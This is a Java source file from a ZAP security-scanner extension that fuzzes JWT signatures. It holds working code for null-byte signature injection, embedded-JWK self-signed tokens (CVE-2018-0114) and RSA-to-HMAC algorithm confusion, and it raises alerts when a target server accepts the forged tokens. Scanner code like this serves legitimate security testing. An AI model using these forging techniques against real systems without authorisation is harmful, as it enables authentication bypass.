/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2019 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.jwt.attacks.fuzzer;

import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.HMAC_256;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JSON_WEB_KEY_HEADER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_ALGORITHM_KEY_HEADER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_EXP_ALGORITHM_IDENTIFIER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_HEADER_WITH_ALGO_PLACEHOLDER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_RSA_ALGORITHM_IDENTIFIER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_RSA_PSS_ALGORITHM_IDENTIFIER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_TOKEN_PERIOD_CHARACTER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.NULL_BYTE_CHARACTER;

import com.nimbusds.jose.JOSEException;
import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.JWSHeader;
import com.nimbusds.jose.JWSSigner;
import com.nimbusds.jose.crypto.MACSigner;
import com.nimbusds.jose.crypto.RSASSASigner;
import com.nimbusds.jose.jwk.JWK;
import com.nimbusds.jose.jwk.JWKSet;
import com.nimbusds.jose.jwk.RSAKey;
import com.nimbusds.jose.jwk.gen.RSAKeyGenerator;
import com.nimbusds.jose.util.Base64URL;
import com.nimbusds.jwt.JWTClaimsSet;
import com.nimbusds.jwt.SignedJWT;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.text.ParseException;
import java.util.List;
import java.util.Objects;
import org.apache.log4j.Logger;
import org.json.JSONException;
import org.json.JSONObject;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.Alert;
import org.zaproxy.zap.extension.jwt.JWTConfiguration;
import org.zaproxy.zap.extension.jwt.JWTTokenBean;
import org.zaproxy.zap.extension.jwt.attacks.ServerSideAttack;
import org.zaproxy.zap.extension.jwt.utils.JWTUtils;
import org.zaproxy.zap.extension.jwt.utils.VulnerabilityType;

/** @author preetkaran20@gmail.com KSASAN */
public class SignatureFuzzer implements JWTFuzzer {

    private static final Logger LOGGER = Logger.getLogger(SignatureFuzzer.class);

    private static final String MESSAGE_PREFIX =
            "jwt.scanner.server.vulnerability.signatureFuzzer.";
    private ServerSideAttack serverSideAttack;

    /**
     * Adds Null Byte to the signature to checks if JWT is vulnerable to Null Byte injection. Main
     * gist of attack is say validator is vulnerable to null byte hence if anything is appended
     * after null byte will be ignored.
     *
     * @throws UnsupportedEncodingException
     */
    private boolean executeNullByteFuzzTokens() throws UnsupportedEncodingException {
        // Appends signature with NullByte plus ZAP eyeCather.
        JWTTokenBean cloneJWTTokenBean = new JWTTokenBean(this.serverSideAttack.getJwtTokenBean());
        if (this.serverSideAttack.getJwtActiveScanner().isStop()) {
            return false;
        }

        if (executeAttack(
                cloneJWTTokenBean.getToken() + NULL_BYTE_CHARACTER + Constant.getEyeCatcher(),
                serverSideAttack)) {
            raiseAlert(
                    MESSAGE_PREFIX,
                    VulnerabilityType.NULL_BYTE,
                    Alert.RISK_MEDIUM,
                    Alert.CONFIDENCE_HIGH,
                    cloneJWTTokenBean.getToken(),
                    serverSideAttack);
            return true;
        }

        if (this.serverSideAttack.getJwtActiveScanner().isStop()) {
            return false;
        }

        // Replaces the signature with NullByte.
        cloneJWTTokenBean.setSignature(JWTUtils.getBytes(NULL_BYTE_CHARACTER));
        if (executeAttack(cloneJWTTokenBean.getToken(), serverSideAttack)) {
            raiseAlert(
                    MESSAGE_PREFIX,
                    VulnerabilityType.NULL_BYTE,
                    Alert.RISK_HIGH,
                    Alert.CONFIDENCE_HIGH,
                    cloneJWTTokenBean.getToken(),
                    serverSideAttack);
            return true;
        }
        return false;
    }

    /**
     * Payload is as per the {@link https://nvd.nist.gov/vuln/detail/CVE-2018-0114} vulnerability
     *
     * @param jwtTokenBean
     * @param vulnerabilityTypeAndFuzzedTokens
     * @throws NoSuchAlgorithmException
     * @throws JOSEException
     * @throws ParseException
     *     <p>TODO Add attack based on Elliptical curve algorithm.
     */
    public boolean executeCustomPrivateKeySignedFuzzToken()
            throws NoSuchAlgorithmException, JOSEException, ParseException {
        JSONObject headerJSONObject =
                new JSONObject(this.serverSideAttack.getJwtTokenBean().getHeader());
        JSONObject payloadJSONObject =
                new JSONObject(this.serverSideAttack.getJwtTokenBean().getPayload());
        String algoType = headerJSONObject.getString(JWT_ALGORITHM_KEY_HEADER);
        if (algoType.startsWith(JWT_RSA_ALGORITHM_IDENTIFIER)
                || algoType.startsWith(JWT_RSA_PSS_ALGORITHM_IDENTIFIER)) {
            if (this.serverSideAttack.getJwtActiveScanner().isStop()) {
                return false;
            }
            if(payloadJSONObject.has(JWT_EXP_ALGORITHM_IDENTIFIER)) {
            	long expiryTimeInMillis = payloadJSONObject.getLong(JWT_EXP_ALGORITHM_IDENTIFIER);
            	expiryTimeInMillis = expiryTimeInMillis + 2000;
            	payloadJSONObject.put(JWT_EXP_ALGORITHM_IDENTIFIER, expiryTimeInMillis);
            }

            // Generating JWK
            RSAKeyGenerator rsaKeyGenerator = new RSAKeyGenerator(2048);
            rsaKeyGenerator.algorithm(JWSAlgorithm.parse(algoType));
            RSAKey rsaKey = rsaKeyGenerator.generate();

            headerJSONObject.put(JSON_WEB_KEY_HEADER, rsaKey.toPublicJWK().toJSONObject());

            // Getting base64 encoded signed token
            JWSSigner signer = new RSASSASigner(rsaKey);
            SignedJWT signedJWT =
                    new SignedJWT(
                            JWSHeader.parse(headerJSONObject.toString()),
                            JWTClaimsSet.parse(payloadJSONObject.toString()));
            signedJWT.sign(signer);
            if (executeAttack(signedJWT.serialize(), serverSideAttack)) {
                raiseAlert(
                        MESSAGE_PREFIX,
                        VulnerabilityType.JWK_CUSTOM_KEY,
                        Alert.RISK_HIGH,
                        Alert.CONFIDENCE_HIGH,
                        signedJWT.serialize(),
                        serverSideAttack);
                return true;
            }
        }
        return false;
    }

    /**
     * Background about the attack:<br>
     * Say an application is using RSA to sign JWT now what will be the verification method {@code
     * verify(String jwtToken, byte[] key); }
     *
     * <p>Now if application is using RSA then for verification RSA public key will be used and in
     * case jwttoken is based on HMAC algorithm then verify method will think key as Secret key for
     * HMAC and will try to decrypt it and as public key is known to everyone so anyone can sign the
     * key with public key and HMAC will accept it.
     */
    private boolean executeAlgoKeyConfusionFuzzedToken() {
        try {
            KeyStore keyStore = KeyStore.getInstance("JKS");
            String trustStorePath = JWTConfiguration.getInstance().getTrustStorePath();
            if (trustStorePath == null) {
                trustStorePath = System.getProperty("javax.net.ssl.trustStore");
            }
            if (Objects.nonNull(trustStorePath)) {
                char[] password =
                        JWTConfiguration.getInstance().getTrustStorePassword().toCharArray();
                keyStore.load(new FileInputStream(trustStorePath), password);

                JWKSet jwkSet = JWKSet.load(keyStore, null);
                List<JWK> trustedKeys = jwkSet.getKeys();
                JWTTokenBean clonedJWTokenBean =
                        new JWTTokenBean(this.serverSideAttack.getJwtTokenBean());
                JSONObject jwtHeaderJSON = new JSONObject(clonedJWTokenBean.getHeader());
                String algoType = jwtHeaderJSON.getString(JWT_ALGORITHM_KEY_HEADER);
                if (algoType.startsWith(JWT_RSA_ALGORITHM_IDENTIFIER)) {
                    String jwtFuzzedHeader =
                            String.format(JWT_HEADER_WITH_ALGO_PLACEHOLDER, HMAC_256);
                    String base64EncodedFuzzedHeaderAndPayload =
                            JWTUtils.getBase64UrlSafeWithoutPaddingEncodedString(jwtFuzzedHeader)
                                    + JWT_TOKEN_PERIOD_CHARACTER
                                    + JWTUtils.getBase64UrlSafeWithoutPaddingEncodedString(
                                            clonedJWTokenBean.getPayload());
                    for (JWK jwk : trustedKeys) {
                        if (this.serverSideAttack.getJwtActiveScanner().isStop()) {
                            return false;
                        }
                        try {
                            if (jwk instanceof RSAKey) {
                                MACSigner macSigner =
                                        new MACSigner(((RSAKey) jwk).toPublicKey().getEncoded());
                                Base64URL signedToken =
                                        macSigner.sign(
                                                JWSHeader.parse(jwtFuzzedHeader),
                                                JWTUtils.getBytes(
                                                        base64EncodedFuzzedHeaderAndPayload));
                                clonedJWTokenBean.setSignature(signedToken.decode());

                                if (executeAttack(clonedJWTokenBean.getToken(), serverSideAttack)) {
                                    raiseAlert(
                                            MESSAGE_PREFIX,
                                            VulnerabilityType.ALGORITHM_CONFUSION,
                                            Alert.RISK_HIGH,
                                            Alert.CONFIDENCE_HIGH,
                                            clonedJWTokenBean.getToken(),
                                            serverSideAttack);
                                    return true;
                                }
                            }
                        } catch (JOSEException | ParseException e) {
                            LOGGER.error(
                                    "Exception occurred while creating fuzzed token for confusion scenario",
                                    e);
                        }
                    }
                }
            }
        } catch (KeyStoreException
                | NoSuchAlgorithmException
                | CertificateException
                | IOException e) {
            LOGGER.error("Exception occurred while getting fuzzed token for confusion scenario", e);
        }
        return false;
    }

    @Override
    public boolean fuzzJWTTokens(ServerSideAttack serverSideAttack) {
        this.serverSideAttack = serverSideAttack;
        try {
            return this.executeCustomPrivateKeySignedFuzzToken()
                    || this.executeAlgoKeyConfusionFuzzedToken()
                    || this.executeNullByteFuzzTokens();
        } catch (NoSuchAlgorithmException
                | JSONException
                | IOException
                | JOSEException
                | ParseException e) {
            LOGGER.error("error occurred while getting signed fuzzed tokens", e);
        }
        return false;
    }
}
